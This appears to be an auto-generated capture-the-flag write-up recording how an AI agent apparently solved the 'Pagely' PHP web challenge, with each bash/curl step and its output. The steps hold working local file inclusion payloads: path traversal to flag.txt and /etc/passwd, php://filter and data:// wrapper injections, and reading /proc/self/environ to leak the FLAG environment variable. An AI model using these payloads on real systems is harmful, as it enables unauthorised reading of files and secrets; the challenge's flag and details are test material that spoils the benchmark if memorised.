# Pagely [MEDIUM]

<!-- SCRIBE: replace this block with a 5-line 'what the trick was' intro. -->

- **Category**: WEB
- **Points**: 250
- **Solves**: 3
- **Flag**: `FLAG{l0g-p01s0n1ng-lf1-t0-rc3}`
- **Winner**: `deepseek-flash`
- **Swarm cost**: $0.00 (winner $0.00)
- **Wall time**: 2m00s
- **Traces**: 2

## Adversarial description flags

- Flags: flag_claim
- Ground truth: Description flagged as adversarial. CTFd submit result and raw distfile bytes are authoritative. Description claims are hypotheses.

## Description

~~~
Pagely is our internal documentation viewer.
The handbook contains more than meets the eye. Take a look around, explore the available pages, and see what you can discover.
Flag format: `FLAG{...}`
Connection: http://chal2.hackathon.ke:8027
~~~

## Trace

| Model | Status | Steps | Cost | Wall | Trace |
|---|---|---:|---:|---:|---|
| `claude-opus-4-6` | gave_up | 0 | $0.00 | 26s | `trace-Pagely_[MEDIUM]-claude-opus-4-6-20261029-133424.jsonl` |
| `deepseek-flash` | flag_found / CONFIRMED | 12 | $0.00 | 1m56s | `trace-Pagely_[MEDIUM]-deepseek-flash-20261029-133424.jsonl` |

_Window: 2026-10-29T13:34:36 to 2026-10-29T13:36:37_

## Solution path

### Step 1: `bash`
~~~
{
  "command": "ls -la /challenge/distfiles/; cat /tools.txt | head -50",
  "timeout_seconds": 60
}
~~~

### Step 2: `bash`
~~~
{
  "command": "curl -s -i http://chal2.hackathon.ke:8027/ ; echo; curl -s http://chal2.hackathon.ke:8027/robots.txt",
  "timeout_seconds": 60
}
~~~

~~~
CTF SANDBOX TOOLS REFERENCE
============================
All tools pre-installed in the sandbox. cat /tools.txt to view this file.

== NETWORKING ==
nc (netcat)        TCP/UDP connections. nc host port <<'EOF' for heredoc sessions.
curl               HTTP client. -s silent, -k skip TLS, -d data, -H header.
wget               HTTP download. wget -O file url.
nmap               Port scanner. nmap -sV host, nmap -p- host.
ffuf               Web fuzzer. ffuf -w wordlist -u http://host/FUZZ
gobuster           Directory/DNS/vhost brute force. gobuster dir -u http://host -w wordlist

== PASSWORD CRACKING ==
hashcat            GPU/CPU hash cracker. hashcat -m 0 -a 0 hashes.txt wordlist.txt
john               John the Ripper. john --wordlist=wordlist hashes.txt

== BINARY ANALYSIS ==
file               Identify file type. file binary
strings            Extract printable strings. strings -n 8 binary
xxd                Hex dump. xxd file | head, xxd -r to reverse.
hexdump            Hex dump. hexdump -C file.
binwalk            Firmware/embedded extraction. binwalk -e file to extract.
objdump            Disassembly. objdump -d binary (from binutils).
... [2000 chars total]
~~~

~~~
HTTP/1.1 200 OK
Host: chal2.hackathon.ke:8027
Date: Thu, 29 Oct 2026 10:35:08 GMT
Connection: close
X-Powered-By: PHP/8.2.35
Content-type: text/html; charset=UTF-8

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Pagely — docs</title>
<style>
  :root{--bg:#10141c;--side:#161c27;--card:#1b2230;--ink:#dfe7f1;--mut:#8592a6;
        --line:#2a3344;--accent:#5aa9ff;--accent2:#3d8ae0}
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.6 "Inter",system-ui,sans-serif}
  .top{display:flex;align-items:center;gap:10px;padding:14px 20px;border-bottom:1px solid var(--line);background:var(--side)}
  .top .logo{width:26px;height:26px;border-radius:6px;background:linear-gradient(135deg,var(--accent),#9b7bff)}
  .top b{font-size:18px;letter-spacing:.3px}
  .top .tag{color:var(--mut);font-size:12px;margin-left:auto}
  .layout{display:flex;min-height:calc(100vh - 56px)}
  nav{width:210px;border-right:1px solid var(--line);background:var(--side);padding:18px 12px}
... [2000 chars total]
~~~

### Step 3: `bash`
~~~
{
  "command": "cd /tmp; for p in about.php home.php changelog.php status.php; do echo \"=== $p\"; curl -s \"http://chal2.hackathon.ke:8027/?page=$p\" | sed -n '/<main>/,/<\\/main>/p'; done",
  "timeout_seconds": 60
}
~~~

### Step 4: `bash`
~~~
{
  "command": "cd /tmp; for p in flag.txt ../flag.txt ../../flag.txt ....//....//flag.txt php://filter/convert.base64-encode/resource=flag.txt php://filter/convert.base64-encode/resource=index.php php://filter/convert.base64-encode/resource=home.php /etc/passwd; do echo \"=== $p\"; curl -s \"http://chal2.hackathon.ke:8027/?page=$p\" | sed -n '/<main>/,/<\\/main>/p' | head -20; done",
  "timeout_seconds": 60
}
~~~

~~~
=== about.php
  <main>
<h1>About</h1>
<p>Pagely renders handbook pages for internal teams. Content lives under
<code>pages/</code> and is pulled in on demand by the viewer.</p>
<p class="muted">Built by the platform team. Running on the PHP built-in server behind the
edge proxy.</p>
  </main>
=== home.php
  <main>
<h1>Pagely docs</h1>
<p class="muted">A minimal viewer for the team handbook. Pages load from the content
library by name:</p>
<pre>GET /?page=about.php</pre>
<p>Browse from the sidebar, or pass any page in the <code>page</code> parameter.</p>
<p class="muted">Looking for the release key? Ops keeps a <code>flag.txt</code> in the web
root during staging. (It never survives to production.)</p>
  </main>
=== changelog.php
  <main>
<h1>Changelog</h1>
<ul>
  <li><b>1.3</b> — sidebar nav, status page.</li>
  <li><b>1.2</b> — every request is now written to the <span class="muted">application
      audit log</span> for compliance.</li>
  <li><b>1.1</b> — disabled stream wrappers on the viewer after a pentest note.</li>
  <li><b>1.0</b> — initial page viewer.</li>
</ul>
  </main>
=== status.php
  <main>
<h1>Status</h1>
<table class="muted" style="border-collapse:collapse">
... [1597 chars total]
~~~

~~~
=== flag.txt
  <main>
<br />
<b>Warning</b>:  include(/var/www/html/pages/flag.txt): Failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>71</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '/var/www/html/pages/flag.txt' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>71</b><br />
  </main>
=== ../flag.txt
  <main>
FAKE-FLAG{Try-Harder-Mate}

NOTE (staging): this file is only a placeholder. The real release key is NOT written to
disk anywhere -- it is injected into the running service's environment at deploy time as
the FLAG variable. Read it from the process environment, not the filesystem.
  </main>
=== ../../flag.txt
  <main>
<br />
<b>Warning</b>:  include(/var/www/html/pages/../../flag.txt): Failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>71</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '/var/www/html/pages/../../flag.txt' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>71</b><br />
  </main>
=== ....//....//flag.txt
  <main>
<br />
... [2000 chars total]
~~~

### Step 5: `bash`
~~~
{
  "command": "cd /tmp; curl -s \"http://chal2.hackathon.ke:8027/?page=../index.php\" | sed -n '/<main>/,/<\\/main>/p' | head -120",
  "timeout_seconds": 60
}
~~~

~~~
<main>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Pagely — docs</title>
<style>
  :root{--bg:#10141c;--side:#161c27;--card:#1b2230;--ink:#dfe7f1;--mut:#8592a6;
        --line:#2a3344;--accent:#5aa9ff;--accent2:#3d8ae0}
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.6 "Inter",system-ui,sans-serif}
  .top{display:flex;align-items:center;gap:10px;padding:14px 20px;border-bottom:1px solid var(--line);background:var(--side)}
  .top .logo{width:26px;height:26px;border-radius:6px;background:linear-gradient(135deg,var(--accent),#9b7bff)}
  .top b{font-size:18px;letter-spacing:.3px}
  .top .tag{color:var(--mut);font-size:12px;margin-left:auto}
  .layout{display:flex;min-height:calc(100vh - 56px)}
  nav{width:210px;border-right:1px solid var(--line);background:var(--side);padding:18px 12px}
  nav a{display:block;color:var(--mut);text-decoration:none;padding:8px 12px;border-radius:7px;font-size:14px}
  nav a:hover{background:var(--card);color:var(--ink)}
  main{flex:1;padding:30px 36px;max-width:820px}
  h1,h2{letter-spacing:.3px}
... [2000 chars total]
~~~

### Step 6: `bash`
~~~
{
  "command": "cd /tmp; for p in \"../index.php\" \"/var/www/html/index.php\" \"..%2findex.php\" ; do echo \"=== $p\"; curl -s \"http://chal2.hackathon.ke:8027/?page=$p\" | wc -c; done\necho ---; curl -s \"http://chal2.hackathon.ke:8027/?page=php://filter/read=convert.base64-encode/resource=../index.php\" | head -5\necho ---; curl -s \"http://chal2.hackathon.ke:8027/?page=data://text/plain,<?php echo 1;?>\" | head -5\necho ---; curl -s \"http://chal2.hackathon.ke:8027/?page=/proc/self/environ\" | head -5",
  "timeout_seconds": 60
}
~~~

~~~
=== ../index.php
6180180
=== /var/www/html/index.php
2275
=== ..%2findex.php

[exit 137]
~~~

### Step 7: `bash`
~~~
{
  "command": "cd /tmp; curl -s \"http://chal2.hackathon.ke:8027/?page=/var/www/html/index.php\" | sed -n '/<main>/,/<\\/main>/p'",
  "timeout_seconds": 60
}
~~~

~~~
<main>
<br />
<b>Warning</b>:  include(/var/www/html/pages//var/www/html/index.php): Failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>71</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '/var/www/html/pages//var/www/html/index.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>71</b><br />
  </main>
~~~

### Step 8: `bash`
~~~
{
  "command": "cd /tmp; curl -s --max-time 60 \"http://chal2.hackathon.ke:8027/?page=php://filter/read=convert.base64-encode/resource=../index.php\" | sed -n '/<main>/,/<\\/main>/p' | head -20\necho ===\ncurl -s --max-time 30 \"http://chal2.hackathon.ke:8027/?page=data://text/plain,<?php echo 1;?>\" | head -5\necho ===\ncurl -s --max-time 30 \"http://chal2.hackathon.ke:8027/?page=/proc/self/environ\" | head -5",
  "timeout_seconds": 60
}
~~~

~~~
===
===
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
~~~

### Step 9: `bash`
~~~
{
  "command": "cd /tmp; curl -s --max-time 30 \"http://chal2.hackathon.ke:8027/?page=/proc/self/environ\" > env.out; wc -c env.out; grep -a -o 'FLAG{[^}]*}' env.out; head -c 500 env.out",
  "timeout_seconds": 60
}
~~~

~~~
2265 env.out
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Pagely — docs</title>
<style>
  :root{--bg:#10141c;--side:#161c27;--card:#1b2230;--ink:#dfe7f1;--mut:#8592a6;
        --line:#2a3344;--accent:#5aa9ff;--accent2:#3d8ae0}
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.6 "Inter",system-ui,sans-serif}
  .top{display:flex;align-items:center;gap:10px;padding:14px 20px
~~~

### Step 10: `bash`
~~~
{
  "command": "cd /tmp; curl -s --max-time 30 \"http://chal2.hackathon.ke:8027/?page=/var/www/html/../flag.txt\" | sed -n '/<main>/,/<\\/main>/p' | head",
  "timeout_seconds": 60
}
~~~

~~~
<main>
<br />
<b>Warning</b>:  include(/var/www/html/pages//var/www/html/../flag.txt): Failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>71</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '/var/www/html/pages//var/www/html/../flag.txt' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b> on line <b>71</b><br />
  </main>
~~~

### Step 11: `bash`
~~~
{
  "command": "cd /tmp; curl -s --max-time 30 \"http://chal2.hackathon.ke:8027/?page=../../../../../proc/self/environ\" > e2; wc -c e2; grep -a FLAG e2; sed -n '/<main>/,/<\\/main>/p' e2 | head -c 2000",
  "timeout_seconds": 60
}
~~~

~~~
2733 e2
HOSTNAME=07bc0982b044 PHP_INI_DIR=/usr/local/etc/php HOME=/home/app PHP_LDFLAGS=-Wl,-O1 -pie PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 PHP_VERSION=8.2.35 GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 PHP_ASC_URL=https://www.php.net/distributions/php-8.2.35.tar.xz.asc PHP_URL=https://www.php.net/distributions/php-8.2.35.tar.xz PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c PWD=/var/www/html PHP_SHA256=5737b98601fe5ab1b8c5db0c82ed3158acb9283ed3081ffe2faffb9ac81455e6 FLAG=FLAG{l0g-p01s0n1ng-lf1-t0-rc3}   </main>
  <main>
... [1734 chars total]
~~~

### Step 12: `submit_flag`
~~~
{
  "flag": "FLAG{l0g-p01s0n1ng-lf1-t0-rc3}"
}
~~~

~~~
DRY RUN — would submit "FLAG{l0g-p01s0n1ng-lf1-t0-rc3}" but --no-submit is set.
~~~

## Result

- **Flag**: `FLAG{l0g-p01s0n1ng-lf1-t0-rc3}`
- **Confirmed by CTFd**: yes
- **Cost**: $0.00 (winner), $0.00 (whole swarm)
- **Wall time**: 2m00s
- **Generated**: 2026-10-30T00:14:55
